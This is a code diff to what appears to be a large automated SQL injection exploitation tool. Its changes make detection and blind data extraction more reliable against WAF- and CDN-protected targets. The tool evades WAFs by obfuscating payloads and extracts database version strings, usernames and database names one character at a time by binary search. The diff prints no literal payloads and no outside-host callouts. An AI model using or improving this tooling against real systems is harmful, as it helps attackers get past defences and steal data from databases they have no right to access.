@@ -128356,7 +128356,17 @@ class TechniqueCascadeEngine:
             # branch to E only; EH now falls through to the elif at ~113494.
             # WAF block pages sometimes contain HTML with SQL-looking fragments;
             # skip error detection entirely when the response is a WAF intercept.
-            if _waf_blocked:
+            # FIX-E-SINGLEWAF (HIGH): _waf_blocked uses is_waf_block() which only
+            # fires when the response body matches WAF fingerprint patterns.  A 403
+            # from Cloudflare whose body does NOT contain WAF keywords (e.g. a plain
+            # JSON error echoing the injected SQL) passes is_waf_block()=False → the
+            # SQL error pattern inside that WAF-intercepted body triggers E detection
+            # as if the SQL reached the database.  single_waf_blocked() additionally
+            # catches 403/406/412 by status code alone (the canonical WAF signal),
+            # which is the correct guard for error-based detection: if the WAF
+            # intercepted the request, any SQL text in the response comes from the
+            # WAF layer, not the DB engine, and is not a valid SQL error signal.
+            if _waf_blocked or WAFBlockDiscriminator.single_waf_blocked(fp):
                 print(f"    [E-error] [{dbms}] req#{self._total_reqs} "
                       f"status={fp.status_code}  WAF-blocked (skipped)")
                 # BUG-V190-001 FIX + TECHNIQUE-22,23,25: Online training on WAF blocks.
@@ -131733,7 +131743,20 @@ class TechniqueCascadeEngine:
             # Without this, BH sends a 2nd false-condition probe per WAF-blocked payload
             # (doubling wasted requests), and EH/TH process the WAF page for SQL
             # errors/timing which are never present.
-            if _waf_blocked:
+            # FIX-EH-SINGLEWAF (HIGH): For EH (error-header technique), is_waf_block()
+            # (used by _waf_blocked) requires body WAF pattern match; a 403 whose body
+            # does not match WAF patterns but does contain SQL error text (WAF echoing)
+            # passes the check and causes false EH detections.  single_waf_blocked()
+            # adds the status-code guard for 403/406/412 that error-based techniques need.
+            # IMPORTANT: single_waf_blocked() is applied ONLY for EH — for BH (boolean-
+            # header) a 403 response IS the injection signal (True header → 403, False →
+            # 200 is a valid boolean oracle).  Applying single_waf_blocked() to BH would
+            # incorrectly skip detection when 403 is the intended True-condition state.
+            # For TH (timing-header), 403 alone is not a timing signal so it is also safe
+            # to treat as WAF-blocked, but we conservatively limit to EH where the false
+            # positive risk from WAF-echoed SQL error patterns is confirmed by logs.
+            _eh_singlewaf = (tech == "EH" and WAFBlockDiscriminator.single_waf_blocked(fp))
+            if _waf_blocked or _eh_singlewaf:
                 _hdr_name = {"EH":"EH-error","BH":"BH-bool","TH":"TH-timing"}.get(tech,tech)
                 print(f"    [{_hdr_name}] [{dbms}] req#{self._total_reqs} "
                       f"status={fp.status_code}  WAF-blocked (skipped)", flush=True)
@@ -164268,8 +164291,27 @@ class ExtractionOrchestrator:
                         result = "".join(_chars)
                         self._total_requests += _ce.request_count
                         if result and "?" not in result:
-                            LOG.info("[Orchestrator] ConditionalErrorExtractor extracted: %s", result[:40])
-                            return result
+                            # FIX-M6D-GARBAGE-UNICODE (HIGH): When ConditionalErrorOracle
+                            # calibrates as 525=True vs 403=False and extraction payloads
+                            # (after apply_heavy_variation + _obfuscate_extraction_cond +
+                            # apply_sql_noise) cause the WAF to respond inconsistently
+                            # (some char-comparison probes randomly reach the DB and trigger
+                            # genuine DB errors at 525), the oracle returns True for every
+                            # probe regardless of the actual condition result.  The binary
+                            # search then drives _c_lo to the maximum (e.g. 65535 or 1114111)
+                            # producing garbage Unicode like '⅗󀫏...' that passes the '?'
+                            # guard (ord('?')=63) because it is >= 32.
+                            # Fix: reject any result containing non-ASCII characters (code
+                            # points > 127).  Database version strings, usernames, and database
+                            # names are always printable ASCII on all supported DBMSes; non-ASCII
+                            # in the result is a reliable indicator of oracle noise.
+                            _m6d_has_nonascii = any(ord(c) > 127 for c in result)
+                            if _m6d_has_nonascii:
+                                LOG.debug("[Orchestrator] ConditionalErrorExtractor rejected "
+                                          "result (non-ASCII chars, oracle noise): %r", result[:40])
+                            else:
+                                LOG.info("[Orchestrator] ConditionalErrorExtractor extracted: %s", result[:40])
+                                return result
             except (asyncio.TimeoutError, TimeoutError):
                 LOG.debug("[Orchestrator] ConditionalErrorExtractor timed out")
             except asyncio.CancelledError:
@@ -187156,6 +187198,15 @@ class ConditionalErrorOracle:
         self._body_size_oracle: bool = False
         self._true_oracle_size: int = 0
         self._false_oracle_size: int = 0
+        # FIX-CEO-CDN-ERROR-ORACLE: Flag set by calibrate() when the "true" state
+        # is a CDN infrastructure error code (520-530, e.g. Cloudflare 525 SSL
+        # Handshake Failed).  Such oracles are valid for calibration (origin crashes →
+        # CDN error → detectable) but unreliable for multi-probe extraction because
+        # obfuscated char-comparison payloads may also trigger CDN errors sporadically,
+        # causing the binary search to converge to garbage Unicode code points.
+        # Method 6d extraction code uses this flag to apply a stricter post-extraction
+        # ASCII validation before accepting the result.
+        self._is_cdn_error_oracle: bool = False
         # FIX-CEO-STATUS-AMBIGUOUS: calibrated HTTP status codes stored alongside
         # sizes so evaluate() can return None when an extraction probe's status
         # matches neither calibrated state (WAF blocking for unrelated reasons).
@@ -187452,10 +187503,26 @@ class ConditionalErrorOracle:
                         _true_err = (_t_st >= 500 or _t_st != self._baseline_status)
                         _false_ok = (_f_st < 500 and _f_st == self._baseline_status)
                         if _true_err and _false_ok:
+                            # FIX-CEO-CDN-ERROR-ORACLE (MEDIUM): Status codes 520-530 are
+                            # Cloudflare/CDN infrastructure errors (520=Unknown Error,
+                            # 521=Web Server Down, 522=Connection Timed Out, 524=Timeout,
+                            # 525=SSL Handshake Failed, etc.).  When the "true" state
+                            # triggers a CDN error (origin crashes → Cloudflare 525),
+                            # calibration can succeed because 525 ≥ 500 → _true_err=True.
+                            # However, during extraction, complex char-comparison payloads
+                            # (after apply_heavy_variation + obfuscation) may produce 525
+                            # for ALL comparisons (not just true conditions) when the WAF
+                            # decides to block them with different responses, or when the
+                            # origin is transiently unstable — leading to binary search
+                            # converging to garbage Unicode.  Flag CDN error oracles so
+                            # the extraction caller can apply stricter validation.
+                            if 520 <= _t_st <= 530:
+                                self._is_cdn_error_oracle = True
                             self._working_template = tpl
                             self._working_prefix   = _prefix  # BUG-CEO-1 FIX: persist context
                             print("[+] [ErrorOracle] Calibrated: status "
                                   f"{_fp_t.status_code} vs {_fp_f.status_code} "
+                                  f"{'(CDN-error oracle — unreliable for extraction) ' if 520 <= _t_st <= 530 else ''}"
                                   f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
                             return True
                         # Body-size fallback: status codes match baseline but body sizes differ
